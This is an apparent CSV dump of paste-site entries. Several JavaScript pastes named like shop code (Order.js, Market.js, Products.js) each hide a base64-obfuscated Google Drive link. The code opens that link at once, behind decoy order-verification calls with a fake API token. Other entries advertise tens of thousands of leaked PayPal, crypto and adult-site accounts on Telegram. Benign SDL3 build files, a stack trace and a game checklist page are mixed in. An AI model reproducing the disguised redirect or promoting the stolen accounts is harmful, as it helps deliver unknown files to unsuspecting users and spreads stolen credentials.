id,title,username,language,date,content
FDaXBS3D,Untitled,zebmekey,JavaScript,Sunday 27th of April 2025 09:57:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ybxUaR9g,Chaturbate with Tokens,jm33,JavaScript,Sunday 27th of April 2025 09:52:23 AM CDT,26469 Accounts Posted On https://t.me/leakedbyem1nem
6AtyngEQ,Untitled,dominus,Diff,Sunday 27th of April 2025 09:43:22 AM CDT,"diff --git a/SDL3Test/U3Dialog.cpp b/SDL3Test/U3Dialog.cpp
index d2c8ff2..007749b 100644
--- a/SDL3Test/U3Dialog.cpp
+++ b/SDL3Test/U3Dialog.cpp
@@ -1,5 +1,5 @@
 #include <filesystem>
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include ""U3Dialog.h""
 #include ""U3Button.h""
 #include ""U3Utilities.h""
diff --git a/SDL3Test/U3Resources.cpp b/SDL3Test/U3Resources.cpp
index a031daa..ab3cd06 100644
--- a/SDL3Test/U3Resources.cpp
+++ b/SDL3Test/U3Resources.cpp
@@ -1,4 +1,4 @@
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include <SDL3/SDL_render.h>
 #include <SDL3/SDL_timer.h>
 #include <iostream>
diff --git a/SDL3Test/UltimaDungeon.cpp b/SDL3Test/UltimaDungeon.cpp
index 8ae5252..acc3067 100644
--- a/SDL3Test/UltimaDungeon.cpp
+++ b/SDL3Test/UltimaDungeon.cpp
@@ -1,4 +1,4 @@
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include ""UltimaDungeon.h""
 #include ""UltimaGraphics.h""
 #include ""U3Misc.h""
"
vMGZn3vQ,Products.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:42:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21679/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hSZH5Ctu,Crypto Accounts,jm33,JavaScript,Sunday 27th of April 2025 09:37:01 AM CDT,68517 Accounts Posted On https://t.me/leakedbyem1nem
EuWMAx9y,2025-04-27T08:29:02.802499,powerampache,PHP,Sunday 27th of April 2025 09:29:05 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""java.security.cert.CertPathValidatorException: Trust anchor for certification path not found."" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
fSSYNVmn,Order.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:27:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17151/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MCnr88Nj,PayPal with Balance,jm33,JavaScript,Sunday 27th of April 2025 09:21:38 AM CDT,91054 Accounts Posted On https://t.me/leakedbyem1nem
1Ht66sgE,Market.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:11:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mr8JDmmx,Nagad manual,modtechmaster,JSON,Sunday 27th of April 2025 09:07:49 AM CDT,"{
  ""title"": ""Nagad manual Otp"",
  ""dis"": ""সম্পূর্ণ ফ্রি কেউ টাকা দিয়ে কিনবেন না"",
  ""link"": ""https://t.me/Mod_Tech_Master"",
  ""show"": false
}
"
3ZSyRxhE,Leaked Accounts - Fresh Hits,jm33,JavaScript,Sunday 27th of April 2025 09:06:17 AM CDT,34141 Accounts Posted On https://t.me/leakedbyem1nem
BkEPYChj,Untitled,zebmekey,JavaScript,Sunday 27th of April 2025 08:56:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FE6A9AGU,Chaturbate with Tokens,jm33,JavaScript,Sunday 27th of April 2025 08:50:55 AM CDT,84808 Accounts Posted On https://t.me/leakedbyem1nem
m3dJYJa2,Untitled,dominus,Make,Sunday 27th of April 2025 08:45:11 AM CDT,"# Compiler and flags
CC = gcc
CXX = g++
CFLAGS = -w -std=c++20
CXXFLAGS = $(CFLAGS)

# Find SDL3 packages using pkg-config
PKGS = sdl3 sdl3-image sdl3-ttf libxml-2.0
CFLAGS += $(shell pkg-config --cflags $(PKGS))
CXXFLAGS += $(shell pkg-config --cflags $(PKGS))
LIBS = $(shell pkg-config --libs $(PKGS))

# Directories
SRC_DIR = SDL3Test
OBJ_DIR = obj
BIN_DIR = bin

# Find all source files
SRCS = $(wildcard $(SRC_DIR)/*.c) $(wildcard $(SRC_DIR)/*.cpp)
OBJS = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(filter %.c,$(SRCS))) \
	$(patsubst $(SRC_DIR)/%.cpp,$(OBJ_DIR)/%.o,$(filter %.cpp,$(SRCS)))

# Target executable name
TARGET = $(BIN_DIR)/LairwareSDL3

# Default target
all: dirs $(TARGET)

# Create necessary directories
dirs:
	@mkdir -p $(OBJ_DIR) $(BIN_DIR)

# Link object files
$(TARGET): $(OBJS)
	$(CXX) -o $@ $^ $(LIBS)

# Compile C source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

# Compile C++ source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

# Clean up
clean:
	rm -rf $(OBJ_DIR) $(BIN_DIR)

# Run the application
run: all
	$(TARGET)

.PHONY: all dirs clean run"
w5XJcXic,Untitled,dominus,Make,Sunday 27th of April 2025 08:42:58 AM CDT,"# Compiler and flags
CC = gcc
CXX = g++
CFLAGS = -w
CXXFLAGS = $(CFLAGS) -std=c++20 -I/opt/arm64/include
LDFLAGS = -L/opt/arm64/lib
SYSLIBS = -framework CoreFoundation

# Find SDL3 packages using pkg-config
PKGS = sdl3 sdl3-image sdl3-ttf libxml-2.0
CFLAGS += $(shell pkg-config --cflags $(PKGS))
CXXFLAGS += $(shell pkg-config --cflags $(PKGS))
LIBS = $(shell pkg-config --libs $(PKGS))

# Directories
SRC_DIR = SDL3Test
OBJ_DIR = obj
BIN_DIR = bin

# Find all source files
SRCS = $(wildcard $(SRC_DIR)/*.c) $(wildcard $(SRC_DIR)/*.cpp)
OBJS = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(filter %.c,$(SRCS))) \
	$(patsubst $(SRC_DIR)/%.cpp,$(OBJ_DIR)/%.o,$(filter %.cpp,$(SRCS)))

# Target executable name
TARGET = $(BIN_DIR)/LairwareSDL3

# Default target
all: dirs $(TARGET)

# Create necessary directories
dirs:
	@mkdir -p $(OBJ_DIR) $(BIN_DIR)

# Link object files
$(TARGET): $(OBJS)
	$(CXX) -o $@ $^ $(LDFLAGS) $(LIBS) $(SYSLIBS)

# Compile C source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

# Compile C++ source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

# Clean up
clean:
	rm -rf $(OBJ_DIR) $(BIN_DIR)

# Run the application
run: all
	$(TARGET)

.PHONY: all dirs clean run"
sZnNg4vT,Order.js,SpawnKz,JavaScript,Sunday 27th of April 2025 08:40:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17820/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kPZeWj35,Crypto Accounts,jm33,JavaScript,Sunday 27th of April 2025 08:35:33 AM CDT,73136 Accounts Posted On https://t.me/leakedbyem1nem
gJ2D14dh,Pristine,JackGrimm,HTML,Sunday 27th of April 2025 08:27:07 AM CDT,"<!DOCTYPE html>
<!--Created by JackGrimm -->
<html><head>
  <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
  <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"">
  <script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js""></script>
  <script src=""https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js""></script>
  
  <script>
  
  </script>
  
</head>
<body>
<div class=""main"">
<h2 style=""text-align: center;"">Pristine Checklist</h2>

<div class=""container"">
<table class=""table table-striped table-bordered "">	
  <tbody>
	<tr>
	
	<p>What Outpost are you at? <button onClick=""window.location.reload();"" type=""button"" class=""btn btn-info"">Refresh Page</button></p>
	<p>Vote Boar Hunting voyages and see which islands are in the pool of available locations.</p>
	<p>Pristine Boars can't spawn on these islands.</p>
	</tr>
	
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Sanctuary"">Sanctuary</button>
	<div id=""Sanctuary"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 4 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanSmug"">Smuggler's Bay</button>
		<div id=""SanSmug"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanLone"">Lone Cove</button>
		<div id=""SanLone"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanCan"">Cannon Cove</button>
		<div id=""SanCan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanCres"">Crescent Isle</button>
		<div id=""SanCres"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanOth"">Other (outside range)</button>
		<div id=""SanOth"" class=""collapse"">Wallow is near Sanctuary! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Merrick"">Port Merrick</button>
	<div id=""Merrick"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerCan"">Cannon Cove</button>
		<div id=""MerCan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerCres"">Crescent Isle</button>
		<div id=""MerCres"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerWan"">Wanderer's Refuge</button>
		<div id=""MerWan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerOth"">Other (outside range)</button>
		<div id=""MerOth"" class=""collapse"">Wallow is near Port Merrick! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Plunder"">Plunder Outpost</button>
	<div id=""Plunder"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluSna"">Snake Island</button>
		<div id=""PluSna"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluSB"">Sharkbait Cove</button>
		<div id=""PluSB"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluCro"">Crook's Hollow</button>
		<div id=""PluCro"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluOth"">Other (outside range)</button>
		<div id=""PluOth"" class=""collapse"">Wallow is near Plunder Outpost! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Ancient"">Ancient Spire</button>
	<div id=""Ancient"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncKra"">Kraken's Fall</button>
		<div id=""AncKra"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncDev"">Devil's Ridge</button>
		<div id=""AncDev"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncCro"">Crook's Hollow</button>
		<div id=""AncCro"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncOth"">Other (outside range)</button>
		<div id=""AncOth"" class=""collapse"">Wallow is near Ancient Spire! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>

   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Dagger"">Dagger Tooth</button>
	<div id=""Dagger"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagOld"">Old Faithful</button>
		<div id=""DagOld"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagSun"">Sunken Grove</button>
		<div id=""DagSun"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagShip"">Shipwreck Bay</button>
		<div id=""DagShip"" class=""collapse"">No Pristine Wallow Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagOth"">Other (outside range)</button>
		<div id=""DagOth"" class=""collapse"">Wallow is near Dagger Tooth! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Galleon"">Galleon's Grave</button>
	<div id=""Galleon"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 2 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalKra"">Kraken's Fall</button>
		<div id=""GalKra"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalSun"">Sunken Grove</button>
		<div id=""GalSun"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalOth"">Other (outside range)</button>
		<div id=""GalOth"" class=""collapse"">Wallow is near Galleon's Grave! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
</div>

</table>
<p>Take a grappel gun and search for treasure glints.</p>
<p>Wallows will have 0 or 5 items.</p>
<p>If the Wallow is empty, scuttle to a new sea.</p>
<p>If the Wallow looks like it's missing items, DIG!!!</p>
</body></html>"
LWAyf37Y,Market.js,SpawnKz,JavaScript,Sunday 27th of April 2025 08:25:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78714/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
